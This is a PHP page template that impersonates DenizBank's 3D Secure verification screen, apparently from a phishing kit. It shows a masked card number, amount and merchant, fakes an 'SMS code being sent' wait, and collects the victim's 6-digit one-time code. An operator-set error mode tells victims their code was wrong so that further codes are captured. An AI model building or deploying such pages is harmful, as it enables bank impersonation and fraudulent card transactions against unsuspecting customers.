<?php require __DIR__ . '/_acs_core.php'; $kg=$kod_goster; $hm=$hata_modu; ?><!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>DenizBank 3D Secure</title>
  <style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{min-height:100vh;background:#e8f4fc;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center}
  .dn-wrap{background:#fff;width:min(420px,96vw);border-radius:10px;box-shadow:0 4px 24px rgba(0,100,180,.15);overflow:hidden}
  .dn-header{background:linear-gradient(135deg,#0069b4,#004a80);padding:16px 22px;display:flex;align-items:center;justify-content:space-between}
  .dn-logo{color:#fff;font-size:22px;font-weight:900;letter-spacing:-1px}
  .dn-logo span{color:#85c8ff}
  .dn-secure{font-size:11px;color:#85c8ff;font-weight:600;border:1px solid #85c8ff55;padding:4px 10px;border-radius:20px}
  .dn-card-strip{background:#e8f4fc;padding:10px 22px;display:flex;align-items:center;gap:12px}
  .dn-card-icon{width:40px;height:28px;background:linear-gradient(135deg,#0069b4,#85c8ff);border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:10px;font-weight:700;flex-shrink:0}
  .dn-card-number{font-size:13px;font-weight:700;color:#004a80;font-family:monospace;letter-spacing:2px}
  .dn-body{padding:20px 22px}
  .dn-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px}
  .dn-info-box{background:#f4faff;border:1px solid #c8e4f8;border-radius:6px;padding:10px 12px}
  .dn-info-box .lbl{font-size:11px;color:#0069b4;font-weight:700;margin-bottom:2px}
  .dn-info-box .val{font-size:13px;color:#222;font-weight:700}
  .hata-box{background:#fff3cd;border:1px solid #ffc107;color:#856404;border-radius:4px;padding:9px 12px;font-size:12.5px;margin-bottom:12px;display:none;align-items:center;gap:7px}
  .dn-label{font-size:13px;color:#555;margin-bottom:8px}
  .dn-label strong{color:#0069b4}
  .dn-input{width:100%;border:2px solid #c8e4f8;border-radius:6px;padding:12px 14px;font-size:22px;letter-spacing:10px;text-align:center;font-weight:700;outline:none;margin-bottom:10px;color:#004a80;transition:.15s}
  .dn-input:focus{border-color:#0069b4;box-shadow:0 0 0 3px #0069b422}
  .dn-timer{font-size:12px;color:#888;text-align:center;margin-bottom:10px}
  .dn-timer span{font-weight:700;color:#0069b4}
  .dn-btn{width:100%;background:linear-gradient(90deg,#0069b4,#004a80);color:#fff;border:none;border-radius:6px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;transition:.15s}
  .dn-btn:hover{background:linear-gradient(90deg,#004a80,#003060)}
  .dn-btn:disabled{opacity:.5;cursor:default}
  .spinner-wrap{text-align:center;padding:22px}
  .spinner{width:44px;height:44px;border:4px solid #c8e4f8;border-top-color:#0069b4;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 12px}
  @keyframes spin{to{transform:rotate(360deg)}}
  .dn-footer{background:#f4faff;border-top:1px solid #c8e4f8;padding:10px 22px;font-size:11px;color:#aac;text-align:center}
  </style>
</head>
<body>
<div class="dn-wrap">
  <div class="dn-header">
    <div class="dn-logo">Deniz<span>Bank</span></div>
    <div class="dn-secure">🔒 3D Secure</div>
  </div>
  <div class="dn-card-strip">
    <div class="dn-card-icon">KART</div>
    <div class="dn-card-number">**** **** **** <?= htmlspecialchars(substr($kart_no,-4)) ?></div>
  </div>
  <div class="dn-body">
    <div class="dn-info-grid">
      <div class="dn-info-box"><div class="lbl">TUTAR</div><div class="val"><?= $tutar ?> ₺</div></div>
      <div class="dn-info-box"><div class="lbl">TARİH</div><div class="val"><?= $zaman ?></div></div>
      <div class="dn-info-box" style="grid-column:1/-1"><div class="lbl">İŞYERİ</div><div class="val"><?= htmlspecialchars($isyeri) ?></div></div>
    </div>

    <div id="state-bekle" <?= $kg ? 'style="display:none"' : '' ?>>
      <div class="spinner-wrap"><div class="spinner"></div></div>
      <p class="dn-label" style="text-align:center">SMS kodu gönderiliyor, lütfen bekleyiniz...</p>
    </div>

    <div id="state-kod" <?= $kg ? '' : 'style="display:none"' ?>>
      <?php if ($hm): ?>
      <div class="hata-box" id="hata-box" style="display:flex">&#9888; Girdiğiniz kod hatalı. Lütfen yeni kodu giriniz.</div>
      <?php else: ?><div class="hata-box" id="hata-box"></div><?php endif; ?>
      <p class="dn-label">Telefonunuza gönderilen <strong>6 haneli SMS kodunu</strong> giriniz:</p>
      <input class="dn-input" id="sms-kod" type="text" inputmode="numeric" maxlength="6" placeholder="______" autocomplete="off" oninput="this.value=this.value.replace(/\D/g,'').slice(0,6);checkAcsBtn()">
      <p class="dn-timer">Kalan süre: <span id="countdown">03:00</span></p>
      <button class="dn-btn" id="acs-submit-btn" onclick="submitAcsKod()" disabled>ONAYLA</button>
    </div>
  </div>
  <div class="dn-footer">🔒 DenizBank Güvenli Ödeme Sistemi</div>
</div>
<?= acs_heartbeat_js($kg, $hm) ?>
</body></html>
